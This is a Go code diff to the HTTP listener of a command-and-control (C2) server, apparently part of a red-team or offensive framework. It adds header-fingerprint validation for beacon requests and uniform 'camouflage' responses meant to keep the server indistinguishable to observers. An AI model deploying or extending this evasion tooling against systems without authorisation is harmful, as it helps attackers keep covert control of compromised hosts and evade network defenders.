@@ -28,6 +28,7 @@ import (
 	"math/rand"
 	"net"
 	"net/http"
+	"strconv"
 	"strings"
 	"sync"
 	"time"
@@ -248,32 +249,36 @@ func (l *HTTPListener) ServeHTTP(w http.ResponseWriter, r *http.Request) {
 		if l.debug {
 			logf("[HTTP] Rate limited %s on %s", clientIP, r.URL.Path)
 		}
-		w.WriteHeader(http.StatusTooManyRequests)
+		writeProfileResponse(w, profile, "", http.StatusTooManyRequests, nil, "")
 		return
 	}
 
 	operation := profile.OperationForPath(r.Method, r.URL.Path)
 	if operation == "" {
-		l.reject(w, profile, "unmatched request %s %s from %s", clientIP)
+		l.reject(w, profile, "", "unmatched request %s %s from %s", r.Method, r.URL.Path, clientIP)
+		return
+	}
+	if err := validateRequestFingerprint(profile, operation, r); err != nil {
+		l.reject(w, profile, operation, "header fingerprint failed for %s %s from %s: %v", r.Method, r.URL.Path, clientIP, err)
 		return
 	}
 
 	body, err := l.readBody(profile, r)
 	if err != nil {
-		l.reject(w, profile, "body read failed for %s %s from %s: %v", r.Method, r.URL.Path, clientIP, err)
+		l.reject(w, profile, operation, "body read failed for %s %s from %s: %v", r.Method, r.URL.Path, clientIP, err)
 		return
 	}
 
 	key := l.c2.GetEncryptionKey()
 
 	if err := verifyHTTPRequest(profile, key, r, body); err != nil {
-		l.reject(w, profile, "auth failed for %s %s from %s: %v", r.Method, r.URL.Path, clientIP, err)
+		l.reject(w, profile, operation, "auth failed for %s %s from %s: %v", r.Method, r.URL.Path, clientIP, err)
 		return
 	}
 
 	message, err := l.extractMessage(profile, r, body)
 	if err != nil {
-		l.reject(w, profile, "undecodable body for %s %s from %s: %v", r.Method, r.URL.Path, clientIP, err)
+		l.reject(w, profile, operation, "undecodable body for %s %s from %s: %v", r.Method, r.URL.Path, clientIP, err)
 		return
 	}
 
@@ -288,20 +293,18 @@ func (l *HTTPListener) ServeHTTP(w http.ResponseWriter, r *http.Request) {
 	if strings.TrimSpace(response) == "" {
 		// Nothing to say: the message was not recognised as C2 traffic. Answer
 		// with the profile's empty status rather than a distinguishable error.
-		w.WriteHeader(profile.Status.Empty)
+		writeProfileResponse(w, profile, operation, profile.Status.Empty, nil, "")
 		return
 	}
 
 	encoded, err := encodeHTTPBody(profile.ResponseBody, response, key)
 	if err != nil {
 		logf("[HTTP] Failed to encode response: %v", err)
-		w.WriteHeader(profile.Status.Error)
+		writeProfileResponse(w, profile, operation, profile.Status.Error, nil, "")
 		return
 	}
 
-	w.Header().Set("Content-Type", responseContentType(profile.ResponseBody))
-	w.WriteHeader(profile.Status.OK)
-	w.Write(encoded)
+	writeProfileResponse(w, profile, operation, profile.Status.OK, encoded, responseContentType(profile.ResponseBody))
 }
 
 // readBody reads at most the profile's limit so a large body cannot exhaust
@@ -363,12 +366,133 @@ func (l *HTTPListener) applyJitter(profile *HTTPProfile) {
 	time.Sleep(time.Duration(minimum+rand.Intn(profile.Jitter.MaxMs-minimum+1)) * time.Millisecond)
 }
 
-// reject logs at most once per request and answers with the not-found status.
-func (l *HTTPListener) reject(w http.ResponseWriter, profile *HTTPProfile, format string, args ...interface{}) {
+// reject logs at most once per request and answers with the profile's shaped
+// not-found response, so the custom response fingerprint is consistent on both
+// accepted traffic and camouflage responses.
+func (l *HTTPListener) reject(w http.ResponseWriter, profile *HTTPProfile, operation, format string, args ...interface{}) {
 	if l.debug {
 		logf("[HTTP] "+format, args...)
 	}
-	w.WriteHeader(profile.Status.NotFound)
+	writeProfileResponse(w, profile, operation, profile.Status.NotFound, nil, "")
+}
+
+func requestHeaderValue(r *http.Request, name string) string {
+	switch {
+	case strings.EqualFold(name, "Host"):
+		return r.Host
+	case strings.EqualFold(name, "Content-Length"):
+		if r.ContentLength < 0 {
+			return ""
+		}
+		return strconv.FormatInt(r.ContentLength, 10)
+	default:
+		return r.Header.Get(name)
+	}
+}
+
+func expandExpectedRequestHeader(profile *HTTPProfile, header HeaderEntry, operation string, r *http.Request) (string, bool) {
+	// Authentication is checked cryptographically after the body is read. Comparing
+	// its dynamic value here would duplicate that code and mishandle timestamps.
+	if strings.Contains(header.Value, "{{auth}}") {
+		return "", false
+	}
+
+	if strings.Contains(header.Value, "{{user_agent}}") {
+		actual := requestHeaderValue(r, header.Name)
+		for _, userAgent := range profile.UserAgents {
+			candidate := strings.ReplaceAll(header.Value, "{{user_agent}}", userAgent)
+			if candidate == actual {
+				return actual, true
+			}
+		}
+		return "", true
+	}
+
+	host := profile.HostHeader
+	if host == "" {
+		// beacon_host is deliberately not part of the server profile type. When no
+		// Host override is configured, HTTP/1.1 presence is enforceable but its
+		// external routing value is not knowable from a bind address.
+		host = r.Host
+	}
+	contentType := ""
+	if r.ContentLength > 0 {
+		contentType = "application/json"
+	}
+	expected := strings.NewReplacer(
+		"{{host}}", host,
+		"{{content_type}}", contentType,
+		"{{content_length}}", strconv.FormatInt(maxInt64(r.ContentLength, 0), 10),
+		"{{method}}", strings.ToUpper(r.Method),
+		"{{path}}", r.URL.Path,
+		"{{request_target}}", r.URL.RequestURI(),
+		"{{operation}}", operation,
+	).Replace(header.Value)
+	return expected, true
+}
+
+func maxInt64(value, minimum int64) int64 {
+	if value < minimum {
+		return minimum
+	}
+	return value
+}
+
+func validateRequestFingerprint(profile *HTTPProfile, operation string, r *http.Request) error {
+	if len(profile.RequestHeaders) == 0 {
+		return nil
+	}
+	for _, header := range profile.RequestHeaders {
+		if !headerEntryApplies(header, operation) {
+			continue
+		}
+		expected, compare := expandExpectedRequestHeader(profile, header, operation, r)
+		if !compare {
+			continue
+		}
+		if actual := requestHeaderValue(r, header.Name); actual != expected {
+			return fmt.Errorf("%s does not match the profile", header.Name)
+		}
+	}
+	return nil
+}
+
+func responseHeaderOmitted(profile *HTTPProfile, name string) bool {
+	for _, omitted := range profile.OmitResponseHeaders {
+		if strings.EqualFold(omitted, name) {
+			return true
+		}
+	}
+	return false
+}
+
+func writeProfileResponse(w http.ResponseWriter, profile *HTTPProfile, operation string, status int, body []byte, contentType string) {
+	for _, name := range profile.OmitResponseHeaders {
+		// A present nil map value is how net/http suppresses automatic Date,
+		// Content-Type and Content-Length generation.
+		w.Header()[http.CanonicalHeaderKey(name)] = nil
+	}
+
+	for _, header := range profile.ResponseHeaders {
+		if !headerEntryApplies(header, operation) || responseHeaderOmitted(profile, header.Name) {
+			continue
+		}
+		value := strings.NewReplacer(
+			"{{content_type}}", contentType,
+			"{{content_length}}", strconv.Itoa(len(body)),
+			"{{operation}}", operation,
+			"{{status}}", strconv.Itoa(status),
+		).Replace(header.Value)
+		w.Header().Add(header.Name, value)
+	}
+
+	if contentType != "" && w.Header().Get("Content-Type") == "" && !responseHeaderOmitted(profile, "Content-Type") {
+		w.Header().Set("Content-Type", contentType)
+	}
+	w.WriteHeader(status)
+	if len(body) > 0 {
+		_, _ = w.Write(body)
+	}
 }
 
 // requestIsEncrypted reports whether the profile describes an encrypted beacon
